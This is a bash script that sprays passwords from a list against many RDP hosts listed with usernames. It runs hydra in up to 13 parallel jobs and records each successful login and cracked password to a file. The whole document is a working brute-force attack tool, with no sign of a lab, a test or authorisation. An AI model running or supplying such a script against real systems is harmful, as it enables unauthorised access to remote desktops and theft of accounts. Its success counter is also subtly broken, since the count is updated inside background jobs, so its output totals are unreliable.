#!/bin/bash

# Define input and output files
iplog_file="iplog.txt"
passwords_file="passwords.txt"
success_log_file="successful_logins.txt"
checked_passwords_file="checked_passwords.txt"

# Function to clean up and save passwords before exiting
cleanup() {
    echo "Exiting script..."
    exit
}

# Trap signals to call cleanup function
trap cleanup SIGINT SIGTERM

# Check if the input files exist
if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
    echo -e "\e[31mOne or both files do not exist, exiting.\e[0m"
    exit 1
fi

# Read RDP entries and passwords
mapfile -t iplog_entries < "$iplog_file"
mapfile -t passwords < "$passwords_file"

successful_attempts=0
total_passwords=${#passwords[@]}
total_hosts=${#iplog_entries[@]}  # Total number of hosts
start_time=$(date +%s)

# Function to attempt login
attempt_login() {
    local entry="$1"
    local password="$2"

    # Parse the entry for IP and username
    if [[ $entry =~ rdp://([^:]+):(.+) ]]; then
        rdp_ip="${BASH_REMATCH[1]}"
        username="${BASH_REMATCH[2]}"
    else
        echo "Invalid entry format: $entry"
        return
    fi

    # Run hydra and capture the output
    hydra_output=$(hydra -l "$username" -p "$password" "$rdp_ip" rdp -t 4 -W 3 2>&1)

    # Check for specific success indicators in the output
    if echo "$hydra_output" | grep -q "success"; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Successful login with $username on rdp://$rdp_ip using password: $password" >> "$success_log_file"
        ((successful_attempts++))
        echo -e "\e[32mSuccessful login with $username on rdp://$rdp_ip using password: $password\e[0m"
    fi
}

# Loop through each password and check against all entries
for password in "${passwords[@]}"; do
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - Currently checking password: $password"

    # Start timer for this password
    password_start_time=$(date +%s)
    attempts=0  # Counter for successful attempts with the current password

    for entry in "${iplog_entries[@]}"; do
        # Attempt login
        attempt_login "$entry" "$password" &

        ((attempts++))

        # Limit to 13 concurrent jobs to reduce load
        while (( $(jobs -r -p | wc -l) >= 13 )); do
            wait -n  # Wait for at least one job to finish
        done
    done

    # Wait for all background jobs to finish for this password
    wait

    # End timer for this password
    password_end_time=$(date +%s)
    password_duration=$(( password_end_time - password_start_time ))

    # Indicate that the password has been checked
    echo "$password has been checked."
    echo -e "Time taken for password '$password': $password_duration seconds."
    
    # Save the checked password for final logging
    echo "$password" >> "$checked_passwords_file"  
done

# Calculate elapsed time and estimate remaining time
end_time=$(date +%s)
elapsed_time=$(( end_time - start_time ))

# Final report
echo -e "\n\e[36m----------------------------------------\e[0m"
echo -e "\e[36mTotal Successful Logins: \e[32m$successful_attempts\e[0m"

# Log the total count of successful logins
echo "$(date '+%Y-%m-%d %H:%M:%S') - Total Successful Logins: $successful_attempts" >> "$success_log_file"
